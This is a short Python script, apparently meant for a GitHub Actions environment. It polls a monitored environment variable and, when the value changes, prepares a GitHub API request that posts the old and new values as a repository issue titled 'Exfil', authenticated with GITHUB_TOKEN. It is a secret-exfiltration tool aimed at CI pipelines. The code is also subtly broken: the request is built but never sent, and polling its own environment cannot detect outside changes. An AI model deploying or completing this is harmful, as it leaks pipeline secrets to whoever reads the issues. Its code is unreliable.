#!/usr/bin/env python3
import os
import json
import time
import urllib.request

GITHUB_TOKEN = os.environ["GITHUB_TOKEN"]
GITHUB_REPOSITORY = os.environ["GITHUB_REPOSITORY"]

MONITORED_VARS = ["TARGET_VAR"]
POLL_INTERVAL = .2

def on_change(var_name, old_value, new_value):
    create_issue(f"{var_name} changed from '{old_value}' to '{new_value}'")

def main():
    previous_values = {var: os.environ.get(var) for var in MONITORED_VARS}

    while True:
        for var in MONITORED_VARS:
            current_value = os.environ.get(var)
            if current_value != previous_values[var]:
                on_change(var, previous_values[var], current_value)
                previous_values[var] = current_value
        time.sleep(POLL_INTERVAL)

def create_issue(exfil):
    title = "Exfil"
    body = exfil

    api_url = f"https://api.github.com/repos/{GITHUB_REPOSITORY}/issues"

    data = json.dumps({
        "title": title,
        "body": body
    }).encode("utf-8")

    headers = {
        "Authorization": f"Bearer {GITHUB_TOKEN}",
        "Accept": "application/vnd.github+json",
        "Content-Type": "application/json"
    }

    urllib.request.Request(api_url, data=data, headers=headers, method="POST")

if __name__ == "__main__":
    main()